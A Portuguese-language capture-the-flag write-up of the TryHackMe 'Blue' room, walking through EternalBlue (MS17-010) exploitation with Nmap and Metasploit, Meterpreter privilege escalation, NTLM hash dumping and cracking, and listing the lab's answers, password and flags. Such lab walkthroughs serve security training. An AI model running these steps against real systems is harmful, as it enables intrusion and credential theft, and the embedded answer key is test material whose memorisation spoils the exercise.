# Blue (EternalBlue) - Writeup

Room: ![TryHackMe Badge](https://tryhackme.com/Lucas.Zafalon/badges/blue?utm_campaign=social_share&utm_medium=social&utm_content=badge&utm_source=copy&sharerId=663e76ced6984cc4849c6b91)

A room **Blue** do TryHackMe é uma máquina Windows focada na exploração da vulnerabilidade **MS17-010 (EternalBlue)**, famosa por ter sido utilizada no ataque do ransomware WannaCry em 2017.
Nesta room aprendemos:

* Enumeração com Nmap
* Exploração SMB
* Uso do Metasploit
* Escalação de privilégios
* Dump de hashes
* Crack de senhas Windows


---

# Task 1 - Recon

A primeira etapa consiste em identificar serviços e possíveis vulnerabilidades na máquina alvo.

O scan recomendado é:

```bash
nmap -sC -sV -Pn <IP>
```

Ou utilizando scripts de vulnerabilidade:

```bash
nmap --script vuln <IP>
```

Durante a enumeração encontramos:

* Porta 135 (MSRPC)
* Porta 139 (NetBIOS)
* Porta 445 (SMB)

O Nmap também identifica a vulnerabilidade:

```bash
smb-vuln-ms17-010
```


---

## Pergunta

### How many ports are open with a port number under 1000?

## Resposta

```bash
3
```

---

## Pergunta

### What is this machine vulnerable to?

## Resposta

```bash
ms17-010
```

---

# Task 2 - Gain Access

Agora utilizamos o Metasploit para explorar a vulnerabilidade EternalBlue.

Iniciamos o Metasploit:

```bash
msfconsole
```

Depois buscamos pelo exploit:

```bash
search ms17-010
```

O exploit correto é:

```bash
exploit/windows/smb/ms17_010_eternalblue
```


---

## Pergunta

### Find the exploitation code we will run against the machine. What is the full path of the code?

## Resposta

```bash
exploit/windows/smb/ms17_010_eternalblue
```

---

Após selecionar o exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Visualizamos as opções:

```bash
show options
```

Precisamos definir o IP da vítima:

```bash
set RHOSTS <IP>
```

---

## Pergunta

### Show options and set the one required value. What is the name of this value?

## Resposta

```bash
RHOSTS
```

---

Depois executamos:

```bash
run
```

Se tudo ocorrer corretamente, teremos uma shell Meterpreter.

---

# Task 3 - Escalate

Agora vamos melhorar nossa sessão e garantir privilégios elevados.

O módulo utilizado para converter a shell em Meterpreter é:

```bash
post/multi/manage/shell_to_meterpreter
```


---

## Pergunta

### What is the full path to the post module we will use?

## Resposta

```bash
post/multi/manage/shell_to_meterpreter
```

---

Depois precisamos informar qual sessão será utilizada:

```bash
set SESSION 1
```

---

## Pergunta

### What option are we required to change?

## Resposta

```bash
SESSION
```

---

Após executar o módulo:

```bash
run
```

Podemos verificar privilégios:

```bash
getuid
```

O esperado é:

```bash
NT AUTHORITY\SYSTEM
```

---

# Task 4 - Cracking

Agora iremos realizar dump dos hashes do Windows.

No Meterpreter:

```bash
hashdump
```

Isso irá retornar hashes NTLM dos usuários do sistema.


---

## Pergunta

### What is the name of the non-default user?

## Resposta

```bash
Jon
```

---

Após copiar o hash do usuário Jon, utilizamos ferramentas como:

* John The Ripper
* CrackStation

O hash revela a senha:

## Pergunta

### What is the cracked password?

## Resposta

```bash
alqfna22
```


---

# Task 5 - Find Flags!

Agora basta navegar pelo sistema Windows em busca das flags.

---

## Flag 1

Localização:

```bash
C:\flag1.txt
```

## Resposta

```bash
flag{access_the_machine}
```

---

## Flag 2

Localização:

```bash
C:\Windows\System32\config\flag2.txt
```

## Resposta

```bash
flag{sam_database_elevated_access}
```

---

## Flag 3

Localização:

```bash
C:\Users\Jon\Documents\flag3.txt
```

## Resposta

```bash
flag{admin_documents_can_be_valuable}
```


---

# Problemas Comuns Durante a Room

A exploração do EternalBlue costuma falhar algumas vezes no TryHackMe.
Problemas comuns:

* Máquina crashando após tentativa
* “Exploit completed, but no session was created”
* Payload não conectando

Soluções comuns:

* Reiniciar a máquina
* Definir corretamente o `LHOST`
* Tentar novamente o exploit
* Utilizar o IP da interface VPN (`tun0`)

Muitos usuários relatam que o exploit pode funcionar apenas após várias tentativas.

---

# Sobre o EternalBlue

O EternalBlue explora uma falha no protocolo SMBv1 da Microsoft, identificada como:

```bash
MS17-010
```

Essa vulnerabilidade permite:

* Execução remota de código
* Acesso remoto ao sistema
* Escalação de privilégios

Foi utilizada em ataques famosos como:

* WannaCry
* NotPetya


---

# Comandos Utilizados

```bash
nmap -sC -sV -Pn <IP>

msfconsole

search ms17-010

use exploit/windows/smb/ms17_010_eternalblue

show options

set RHOSTS <IP>

run

hashdump

getuid
```

---

# Conclusão

A room Blue é uma excelente introdução para:

* Exploração SMB
* Vulnerabilidades Windows
* Uso do Metasploit
* Pós-exploração
* Dump de hashes NTLM

Além disso, ela demonstra na prática o impacto crítico de sistemas Windows desatualizados e vulnerabilidades conhecidas como o MS17-010.

